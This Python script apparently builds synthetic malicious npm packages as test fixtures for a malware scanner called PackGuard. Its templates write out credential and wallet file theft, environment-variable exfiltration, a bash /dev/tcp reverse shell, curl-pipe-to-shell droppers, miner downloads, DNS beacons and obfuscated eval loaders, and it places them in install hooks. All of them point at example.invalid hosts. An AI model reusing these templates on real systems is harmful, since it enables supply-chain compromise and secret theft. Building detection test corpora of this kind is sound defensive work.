import argparse
import base64
import os
import random
import sys

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

import common

KNOWN_DERIVED = ("T1_format", "T2_rename", "T3_padding", "T4_base64",
                 "payload_base64", "payload_hex")
KNOWN_AUTHORED = ("install_scripts", "typosquat", "dropper", "stealer",
                  "padded_loader", "encoded_loader", "multi_stage")
NEW_PRIMITIVE = ("net_host", "net_sensitive", "webhook_exec", "env_exec_net",
                 "eval_decode", "obfuscated", "stream_clone", "reverse_shell",
                 "wallet_stealer", "credential_harvest", "dns_beacon",
                 "crypto_miner", "telegram_bot", "discord_webhook",
                 "env_dump", "obfuscated_loader", "split_payload", "hex_loader")
NEW_SCRIPT = ("script_net_host", "script_net_sensitive", "script_net_encoding",
              "script_reverse_shell", "script_dependency_confusion", "script_env_exfil")
NEW_CATEGORIES = NEW_PRIMITIVE + NEW_SCRIPT


def filler(rng, count):
    """Returns harmless JavaScript statements that pad a fixture past the tiny-chunk limit."""
    words = ("alpha", "bravo", "charlie", "delta", "echo", "foxtrot", "golf", "hotel",
             "india", "juliet", "kilo", "lima")
    lines = []
    for index in range(count):
        lines.append('const %s%d = "%s-%d";' % (rng.choice(words), index, rng.choice(words),
                                                rng.randint(1, 99999)))
    return "\n".join(lines)


def json_string(value):
    """Returns a JSON string literal for value."""
    return '"' + str(value).replace("\\", "\\\\").replace('"', '\\"') + '"'


def package_json(name, version, scripts=None, dependencies=None):
    """Builds a minimal package.json, optionally with install hooks and dependencies."""
    lines = ['{', '  "name": %s,' % json_string(name), '  "version": %s,' % json_string(version),
             '  "description": "PackGuard test fixture",', '  "main": "index.js",']
    if dependencies:
        lines.append('  "dependencies": {')
        items = list(dependencies.items())
        for index, (key, value) in enumerate(items):
            comma = "," if index + 1 < len(items) else ""
            lines.append('    %s: %s%s' % (json_string(key), json_string(value), comma))
        lines.append('  },')
    if scripts:
        lines.append('  "scripts": {')
        items = [("%s" % common.HOOKS[index], command)
                 for index, command in enumerate(scripts[:len(common.HOOKS)])]
        for index, (hook, command) in enumerate(items):
            comma = "," if index + 1 < len(items) else ""
            lines.append('    %s: %s%s' % (json_string(hook), json_string(command), comma))
        lines.append('  },')
    lines.append('  "license": "MIT"')
    lines.append('}')
    return ("\n".join(lines) + "\n").encode("utf-8")


def finalise(name, version, files, scripts=None, dependencies=None):
    """Adds a realistic package.json and removes reference-style script files."""
    out = {key: value for key, value in files.items() if key != common.SCRIPTS_FILE}
    if scripts is None and common.SCRIPTS_FILE in files:
        text = files[common.SCRIPTS_FILE].decode("utf-8", "surrogateescape")
        scripts = [line for line in text.splitlines() if line.strip()]
    out["package.json"] = package_json(name, version, scripts, dependencies)
    return out


def payload_text(name):
    """Returns a harmless decoded payload used inside loader fixtures."""
    return '"use strict";\nconst fixture = %s;\nmodule.exports = { fixture, ok: true };\n' % json_string(name)


def js_net_host(rng, name):
    """Builds a host-identity exfiltration fixture."""
    return """
const os = require("os");
const https = require("https");
%s
const identity = os.userInfo().username + "@" + os.hostname();
const target = "https://telemetry.example.invalid/collect?id=" + encodeURIComponent(identity);
https.get(target, (response) => {
  let body = "";
  response.on("data", (chunk) => { body += chunk; });
  response.on("end", () => { module.exports = body.length; });
});
fetch(target).then((response) => response.text()).catch(() => null);
module.exports = { identity, target, version: %s };
""" % (filler(rng, 8), json_string(name))


def js_net_sensitive(rng, name):
    """Builds a sensitive-file exfiltration fixture."""
    return """
const fs = require("fs");
const os = require("os");
const https = require("https");
%s
const candidates = [os.homedir() + "/.ssh/id_rsa", os.homedir() + "/.npmrc", os.homedir() + "/.aws/credentials"];
const stolen = candidates.map((path) => {
  try { return fs.readFileSync(path, "utf8"); } catch (error) { return ""; }
}).join("\\n");
const request = https.request({ host: "drop.example.invalid", path: "/upload", method: "POST" }, () => null);
request.end(stolen);
module.exports = { candidates, version: %s };
""" % (filler(rng, 8), json_string(name))


def js_webhook_exec(rng, name):
    """Builds a webhook-plus-execution fixture."""
    return """
const { execSync } = require("child_process");
const os = require("os");
%s
const webhook = "https://discord.example.invalid/api/webhooks/000000/fixture";
const command = "curl -s " + webhook + " -d " + JSON.stringify(os.hostname());
execSync(command, { stdio: "ignore" });
module.exports = { webhook, version: %s };
""" % (filler(rng, 8), json_string(name))


def js_env_exec_net(rng, name):
    """Builds an environment-dump plus execution fixture."""
    return """
const { exec } = require("child_process");
%s
const dump = Object.keys(process.env).map((key) => key + "=" + process.env[key]).join("&");
const request = "curl -s http://collector.example.invalid/env?" + encodeURIComponent(dump);
exec(request);
const axios = require("axios");
axios.post("http://collector.example.invalid/env", { dump }).catch(() => null);
module.exports = { dump, version: %s };
""" % (filler(rng, 8), json_string(name))


def js_eval_decode(rng, name):
    """Builds an eval plus decode fixture with a harmless decoded body."""
    encoded = base64.b64encode(payload_text(name).encode("utf-8")).decode("ascii")
    return """
const blob = "%s";
%s
const decoded = Buffer.from(blob, "base64").toString();
eval(decoded);
module.exports = { size: blob.length };
""" % (encoded, filler(rng, 8))


def js_obfuscated(rng, name):
    """Builds an obfuscated loader with _0x names, atob and eval."""
    host = base64.b64encode(b"hostname").decode("ascii")
    body = base64.b64encode(payload_text(name).encode("utf-8")).decode("ascii")
    first, module, decoded, value = (rng.randint(0x1000, 0xffff) for _ in range(4))
    return """
var _0x{first:04x} = ["{host}", "{body}", "{name}"];
var _0x{module:04x} = require("os");
{filler}
var _0x{decoded:04x} = atob(_0x{first:04x}[0]);
var _0x{value:04x} = _0x{module:04x}[_0x{decoded:04x}]();
eval(atob(_0x{first:04x}[1]));
fetch("https://cdn.example.invalid/p?x=" + _0x{value:04x});
module.exports = {{ _0x{value:04x}: _0x{value:04x}, version: "{name}" }};
""".format(first=first, host=host, body=body, name=name, module=module,
           filler=filler(rng, 8), decoded=decoded, value=value)


def js_stream_clone(rng, name):
    """Builds a one-shot browser beacon fixture."""
    return """
(function () {
  var host = window.location.hostname;
  var cookie = document.cookie;
  var href = window.location.href;
  %s
  var beacon = "https://beacon.example.invalid/p?h=" + encodeURIComponent(host) + "&c=" + encodeURIComponent(cookie) + "&u=" + encodeURIComponent(href);
  var image = new Image();
  image.src = beacon;
  window.__fixture = beacon;
})();
""" % filler(rng, 10)


def js_reverse_shell(rng, name):
    """Builds an inert reverse-shell fixture pointed at an invalid host."""
    return """
const net = require("net");
const os = require("os");
const { exec } = require("child_process");
%s
const target = os.hostname();
const socket = net.connect(4444, "shell.example.invalid", () => { socket.destroy(); });
exec("bash -c 'bash -i >& /dev/tcp/shell.example.invalid/4444 0>&1'", { env: { HOST: target } });
module.exports = { target, version: %s };
""" % (filler(rng, 8), json_string(name))


def js_wallet_stealer(rng, name):
    """Builds a wallet-file exfiltration fixture against dummy paths."""
    return """
const fs = require("fs");
const os = require("os");
const https = require("https");
%s
const wallets = [os.homedir() + "/.ethereum/keystore", os.homedir() + "/.bitcoin/wallet.dat", os.homedir() + "/wallet.dat"];
const data = wallets.map((path) => {
  try { return fs.readFileSync(path, "utf8"); } catch (error) { return ""; }
}).join("\\n");
const request = https.request({ host: "wallet.example.invalid", path: "/u", method: "POST" }, () => null);
request.end(data);
module.exports = { wallets, version: %s };
""" % (filler(rng, 8), json_string(name))


def js_credential_harvest(rng, name):
    """Builds a credential-file harvest fixture against dummy paths."""
    return """
const fs = require("fs");
const os = require("os");
const https = require("https");
%s
const files = [os.homedir() + "/.npmrc", os.homedir() + "/.git-credentials", os.homedir() + "/.aws/credentials", os.homedir() + "/.ssh/id_rsa"];
const blob = files.map((path) => {
  try { return fs.readFileSync(path, "utf8"); } catch (error) { return ""; }
}).join("\\n");
fetch("https://creds.example.invalid/upload", { method: "POST", body: blob }).catch(() => null);
module.exports = { files, version: %s };
""" % (filler(rng, 8), json_string(name))


def js_dns_beacon(rng, name):
    """Builds a DNS beacon fixture."""
    return """
const dns = require("dns");
const os = require("os");
const { execSync } = require("child_process");
%s
const label = os.hostname() + "." + os.userInfo().username;
const beacon = label + ".beacon.example.invalid";
dns.lookup(beacon, () => null);
execSync("nslookup " + beacon);
module.exports = { beacon, version: %s };
""" % (filler(rng, 8), json_string(name))


def js_crypto_miner(rng, name):
    """Builds a miner-download fixture pointed at an invalid host."""
    return """
const os = require("os");
const { exec } = require("child_process");
%s
const source = "http://miner.example.invalid/xmrig";
exec("curl -s " + source + " -o /tmp/pg-miner && chmod +x /tmp/pg-miner");
fetch(source + "?h=" + encodeURIComponent(os.hostname())).catch(() => null);
module.exports = { source, version: %s };
""" % (filler(rng, 8), json_string(name))


def js_telegram_bot(rng, name):
    """Builds a Telegram webhook fixture."""
    return """
const os = require("os");
const { execSync } = require("child_process");
%s
const hook = "https://api.telegram.example.invalid/bot000000:FAKE/sendMessage?text=" + encodeURIComponent(os.hostname());
execSync("curl -s \\"" + hook + "\\"");
module.exports = { hook, version: %s };
""" % (filler(rng, 8), json_string(name))


def js_discord_webhook(rng, name):
    """Builds a Discord webhook fixture."""
    return """
const https = require("https");
const os = require("os");
const { execSync } = require("child_process");
%s
const hook = "https://discord.example.invalid/api/webhooks/000000/FAKE";
https.get(hook + "?h=" + encodeURIComponent(os.hostname()));
execSync("curl -s " + hook + " -d host=" + os.hostname());
module.exports = { hook, version: %s };
""" % (filler(rng, 8), json_string(name))


def js_env_dump(rng, name):
    """Builds an environment-variable dump fixture."""
    return """
const { exec } = require("child_process");
%s
const dump = Object.entries(process.env).map((entry) => entry[0] + "=" + entry[1]).join("&");
exec("curl -s http://env.example.invalid/d?" + dump);
module.exports = { dump, version: %s };
""" % (filler(rng, 8), json_string(name))


def js_obfuscated_loader(rng, name):
    """Builds a two-stage obfuscated loader fixture."""
    stage = base64.b64encode(payload_text(name).encode("utf-8")).decode("ascii")
    return """
var _0x{first:04x} = ["{stage}"];
var _0x{second:04x} = atob(_0x{first:04x}[0]);
var _0x{third:04x} = Buffer.from(_0x{second:04x}, "base64").toString();
{filler}
eval(_0x{third:04x});
fetch("https://cdn.example.invalid/loader.js?x=" + _0x{third:04x}.length);
module.exports = {{ loaded: true, version: "{name}" }};
""".format(first=rng.randint(0x1000, 0xffff), stage=stage, second=rng.randint(0x1000, 0xffff),
           third=rng.randint(0x1000, 0xffff), filler=filler(rng, 8), name=name)


def js_split_payload(rng, name):
    """Builds a split base64 loader fixture."""
    payload = base64.b64encode(payload_text(name).encode("utf-8")).decode("ascii")
    middle = len(payload) // 2
    return """
const parts = ["%s", "%s"];
const blob = parts.join("");
%s
eval(Buffer.from(blob, "base64").toString());
fetch("https://cdn.example.invalid/p?x=" + blob.length);
module.exports = { parts: parts.length, version: %s };
""" % (payload[:middle], payload[middle:], filler(rng, 8), json_string(name))


def js_hex_loader(rng, name):
    """Builds a hex-encoded loader fixture."""
    encoded = payload_text(name).encode("utf-8").hex()
    return """
const blob = "%s";
%s
eval(Buffer.from(blob, "hex").toString());
module.exports = { size: blob.length };
""" % (encoded, filler(rng, 8))


def js_typosquat(rng, name):
    """Builds a typosquat-style fixture with a postinstall dropper."""
    return """
const os = require("os");
const https = require("https");
const { execSync } = require("child_process");
%s
const endpoint = "https://postinstall.example.invalid/run?id=" + encodeURIComponent(os.hostname());
https.get(endpoint, () => null);
execSync("curl -s " + endpoint + " | sh", { stdio: "ignore" });
module.exports = { endpoint, version: %s };
""" % (filler(rng, 8), json_string(name))


def js_dropper(rng, name):
    """Builds a download-and-execute dropper fixture."""
    url = "http://cdn.example.invalid/payload.bin"
    return """
const os = require("os");
const { exec } = require("child_process");
%s
const url = %s;
exec("curl -s " + url + " -o /tmp/pg-payload && chmod +x /tmp/pg-payload && /tmp/pg-payload", { env: { HOST: os.hostname() } });
fetch(url + "?h=" + encodeURIComponent(os.hostname())).catch(() => null);
module.exports = { url, version: %s };
""" % (filler(rng, 8), json_string(url), json_string(name))


def js_stealer(rng, name):
    """Builds a combined credential and environment stealer fixture."""
    return """
const fs = require("fs");
const os = require("os");
const https = require("https");
%s
const paths = [os.homedir() + "/.npmrc", os.homedir() + "/.aws/credentials", os.homedir() + "/.ssh/id_rsa"];
const env = Object.entries(process.env).map((entry) => entry[0] + "=" + entry[1]).join("&");
const blob = paths.map((path) => {
  try { return fs.readFileSync(path, "utf8"); } catch (error) { return ""; }
}).join("\\n") + "&" + env;
https.request({ host: "stealer.example.invalid", path: "/u", method: "POST" }, () => null).end(blob);
module.exports = { paths, version: %s };
""" % (filler(rng, 8), json_string(name))


def js_padded_loader(rng, name):
    """Builds a loader hidden behind dead-code padding."""
    dead = "".join("function _pg_pad_%d(){var x=%d;return x;}\n" % (i, rng.randint(1, 99999))
                   for i in range(320))
    return dead + js_obfuscated_loader(rng, name) + "\n" + dead


def js_encoded_loader(rng, name):
    """Builds a base64-only loader fixture."""
    encoded = base64.b64encode(payload_text(name).encode("utf-8")).decode("ascii")
    return """
const blob = "%s";
%s
const stage = Buffer.from(blob, "base64").toString();
module.exports = { stage, version: %s };
""" % (encoded, filler(rng, 8), json_string(name))


def js_multi_stage(rng, name):
    """Builds a multi-stage decoder fixture."""
    stage = base64.b64encode(payload_text(name).encode("utf-8")).decode("ascii")
    return """
const one = "%s";
const two = one.split("").reverse().join("");
%s
const stage = Buffer.from(two.split("").reverse().join(""), "base64").toString();
eval(stage);
fetch("https://stage.example.invalid/next?x=" + stage.length);
module.exports = { stage, version: %s };
""" % (stage, filler(rng, 8), json_string(name))


PRIMITIVE_TEMPLATES = {
    "net_host": js_net_host,
    "net_sensitive": js_net_sensitive,
    "webhook_exec": js_webhook_exec,
    "env_exec_net": js_env_exec_net,
    "eval_decode": js_eval_decode,
    "obfuscated": js_obfuscated,
    "stream_clone": js_stream_clone,
    "reverse_shell": js_reverse_shell,
    "wallet_stealer": js_wallet_stealer,
    "credential_harvest": js_credential_harvest,
    "dns_beacon": js_dns_beacon,
    "crypto_miner": js_crypto_miner,
    "telegram_bot": js_telegram_bot,
    "discord_webhook": js_discord_webhook,
    "env_dump": js_env_dump,
    "obfuscated_loader": js_obfuscated_loader,
    "split_payload": js_split_payload,
    "hex_loader": js_hex_loader,
}

AUTHORED_TEMPLATES = {
    "typosquat": js_typosquat,
    "dropper": js_dropper,
    "stealer": js_stealer,
    "padded_loader": js_padded_loader,
    "encoded_loader": js_encoded_loader,
    "multi_stage": js_multi_stage,
}

SCRIPT_TEMPLATES = {
    "script_net_host": [
        "curl -s http://example.invalid/p.sh | sh",
        "nslookup $(whoami).example.invalid",
    ],
    "script_net_sensitive": [
        "curl -s -X POST --data-binary @$HOME/.npmrc http://example.invalid/u",
    ],
    "script_net_encoding": [
        "wget -q http://example.invalid/blob.b64 -O /tmp/pg.b64",
        "node -e \"eval(Buffer.from(require('fs').readFileSync('/tmp/pg.b64','utf8'),'base64').toString())\"",
    ],
    "script_reverse_shell": [
        "curl -s http://example.invalid/s.sh | bash -c 'bash -i >& /dev/tcp/example.invalid/4444 0>&1'",
    ],
    "script_dependency_confusion": [
        "curl -s http://registry.example.invalid/$(whoami)/pkg.tgz -o /tmp/pkg.tgz && npm install /tmp/pkg.tgz --registry http://registry.example.invalid/",
    ],
    "script_env_exfil": [
        "curl -s \"http://example.invalid/?k=$AWS_SECRET_ACCESS_KEY&h=$(whoami)\"",
    ],
}

KNOWN_SCRIPT_CATEGORIES = ("script_net_host", "script_net_sensitive", "script_net_encoding")


def build_new_package(category, index, rng):
    """Returns (name, version, files) for one invented new-campaign package."""
    name = "pg-fixture-new-%s-%04d" % (category, index)
    version = "1.0.%d" % (index % 1000)
    if category in SCRIPT_TEMPLATES:
        files = {"package.json": package_json(name, version, SCRIPT_TEMPLATES[category])}
        if category == "script_net_encoding":
            files["index.js"] = js_eval_decode(rng, name).encode("utf-8")
        if category == "script_reverse_shell":
            files["index.js"] = js_reverse_shell(rng, name).encode("utf-8")
        return name, version, files
    template = PRIMITIVE_TEMPLATES[category]
    files = {"index.js": template(rng, name).encode("utf-8"),
             "package.json": package_json(name, version)}
    if category in ("net_host", "net_sensitive", "credential_harvest", "stealer",
                    "wallet_stealer", "env_dump"):
        files["lib/collector.js"] = template(rng, name + "-collector").encode("utf-8")
    return name, version, files


def build_authored_package(category, index, rng, prefix):
    """Returns (name, version, files) for one authored known-family package."""
    name = "pg-fixture-%s-%s-%04d" % (prefix, category, index)
    version = "1.1.%d" % (index % 1000)
    template = AUTHORED_TEMPLATES[category]
    scripts = None
    if category in ("typosquat", "dropper"):
        scripts = SCRIPT_TEMPLATES["script_net_host"]
    elif category == "stealer":
        scripts = SCRIPT_TEMPLATES["script_net_sensitive"]
    files = {"index.js": template(rng, name).encode("utf-8"),
             "package.json": package_json(name, version, scripts)}
    if category in ("typosquat", "dropper"):
        files["lib/install.js"] = js_typosquat(rng, name + "-install").encode("utf-8")
    if category == "stealer":
        files["lib/collect.js"] = js_credential_harvest(rng, name + "-collect").encode("utf-8")
    return name, version, files


def list_packages(zip_path):
    """Returns the sorted (group, name, version) keys in one shipped corpus zip."""
    keys = set()
    with common.zipfile.ZipFile(zip_path) as archive:
        for info in archive.infolist():
            if info.is_dir():
                continue
            parts = [p for p in info.filename.replace("\\", "/").split("/") if p]
            if len(parts) >= 3 and "@" in parts[1]:
                name, version = parts[1].rsplit("@", 1)
                keys.add((parts[0], name, version))
    return sorted(keys)


def read_selected(zip_path, wanted):
    """Reads only the wanted package keys from one shipped corpus zip."""
    out = {}
    with common.zipfile.ZipFile(zip_path) as archive:
        for info in archive.infolist():
            if info.is_dir() or info.file_size == 0:
                continue
            parts = [p for p in info.filename.replace("\\", "/").split("/") if p]
            if len(parts) < 3 or "@" not in parts[1]:
                continue
            name, version = parts[1].rsplit("@", 1)
            key = (parts[0], name, version)
            if key not in wanted:
                continue
            out.setdefault(key, {})[common.safe_component("__".join(parts[2:]))] = archive.read(info, pwd=common.PASSWORD)
    return out


def sample_bases(count, seed):
    """Reservoir-samples real base packages across the v1 and v2 zips."""
    rng = random.Random(seed)
    zips = common.corpus_zips("v1") + common.corpus_zips("v2")
    per_zip = max(1, count // len(zips))
    bases = []
    for zip_path in zips:
        keys = list_packages(zip_path)
        if len(keys) <= per_zip:
            chosen = keys
        else:
            chosen = rng.sample(keys, per_zip)
            chosen.sort()
        got = read_selected(zip_path, set(chosen))
        for key in chosen:
            if key in got:
                files = common.truncated_files(got[key], 32 * 1024)
                if any(common.is_js(name) for name in files):
                    bases.append((key, files))
    return bases


def build_known_invented(per_category, seed, out_root):
    """Builds the mangled, payload, install-script and authored known-mode packages."""
    rng = random.Random(seed)
    bases = sample_bases(per_category, seed)
    manifest = []
    for index, (key, files) in enumerate(bases):
        group, base_name, base_version = key
        for category in KNOWN_DERIVED:
            name = "pg-fixture-known-%s-%04d" % (category.lower(), index)
            version = "2.0.%d" % (index % 1000)
            if category.startswith("payload_"):
                if index % 2:
                    continue
                source = next((files[item] for item in sorted(files) if common.is_js(item)), b"")
                snippet = source[:8192]
                encoding = "base64" if category.endswith("base64") else "hex"
                encoded = base64.b64encode(snippet).decode("ascii") if encoding == "base64" else snippet.hex()
                body = 'const _p = "%s";\neval(Buffer.from(_p, "%s").toString());\n' % (encoded, encoding)
                final = finalise(name, version, {"index.js": body.encode("ascii")})
            else:
                transformed = common.transform_files(files, category, rng)
                if not transformed:
                    continue
                final = finalise(name, version, transformed)
            common.write_package(os.path.join(out_root, category, "%s@%s" % (name, version)), final)
            manifest.append({"set": "known", "kind": "invented", "category": category,
                             "package": name, "version": version, "base_group": group,
                             "base": "%s@%s" % (base_name, base_version)})
    for category in KNOWN_AUTHORED:
        for index in range(per_category):
            if category == "install_scripts":
                name = "pg-fixture-known-install-scripts-%04d" % index
                version = "2.2.%d" % (index % 1000)
                commands = SCRIPT_TEMPLATES[KNOWN_SCRIPT_CATEGORIES[index % len(KNOWN_SCRIPT_CATEGORIES)]]
                files = {"package.json": package_json(name, version, commands),
                         "index.js": js_typosquat(rng, name).encode("utf-8")}
            else:
                name, version, files = build_authored_package(category, index, rng, "known")
            common.write_package(os.path.join(out_root, category, "%s@%s" % (name, version)), files)
            js, scripts = common.package_primitive_hits(files)
            manifest.append({"set": "known", "kind": "invented", "category": category,
                             "package": name, "version": version, "base_group": None, "base": None,
                             "primitive_flagged": common.primitives_flagged(js, False)
                                                 or common.primitives_flagged(scripts, True),
                             "primitive_hits": sorted(js | scripts)})
    return manifest


def build_new_invented(per_category, seed, out_root):
    """Builds the synthetic new-campaign packages."""
    rng = random.Random(seed + 1)
    manifest = []
    for category in NEW_CATEGORIES:
        for index in range(per_category):
            name, version, files = build_new_package(category, index, rng)
            common.write_package(os.path.join(out_root, category, "%s@%s" % (name, version)), files)
            js, scripts = common.package_primitive_hits(files)
            manifest.append({"set": "new", "kind": "invented", "category": category,
                             "package": name, "version": version,
                             "primitive_flagged": common.primitives_flagged(js, False)
                                                 or common.primitives_flagged(scripts, True),
                             "primitive_hits": sorted(js | scripts)})
    return manifest


def main():
    """Parses arguments and writes the invented packages for both sets."""
    parser = argparse.ArgumentParser()
    parser.add_argument("--derived-bases", type=int, default=600)
    parser.add_argument("--per-category", type=int, default=300)
    parser.add_argument("--seed", type=int, default=20261106)
    parser.add_argument("--known-out", default=os.path.join(common.TEST_SETS, "known", "invented"))
    parser.add_argument("--new-out", default=os.path.join(common.TEST_SETS, "new", "invented"))
    parser.add_argument("--manifest", default=os.path.join(common.TEST_SETS, "manifest_invented.json"))
    args = parser.parse_args()
    for root in (args.known_out, args.new_out):
        common.remove_tree(root)
        os.makedirs(root, exist_ok=True)
    known = build_known_invented(args.derived_bases, args.seed, args.known_out)
    new = build_new_invented(args.per_category, args.seed, args.new_out)
    common.write_manifest(args.manifest, known + new)
    print("known invented", len(known), "new invented", len(new), "total", len(known) + len(new))


if __name__ == "__main__":
    main()
